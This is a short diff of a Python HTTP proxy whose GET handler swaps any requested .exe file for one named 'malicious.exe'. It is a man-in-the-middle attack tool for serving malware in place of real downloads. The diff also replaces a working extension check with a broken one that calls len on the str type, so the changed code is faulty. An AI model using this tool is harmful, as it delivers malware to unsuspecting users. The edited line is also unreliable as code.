@@ -9,7 +9,7 @@ PORT = 80
 class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_GET(self):
         # manages swapping exe files
-        if self.path[:-4:-1] == "exe":
+        if self.path[(len(str))-3:] == "exe":
           self.path="/malicious.exe"
         else:
           # redirect appropriately
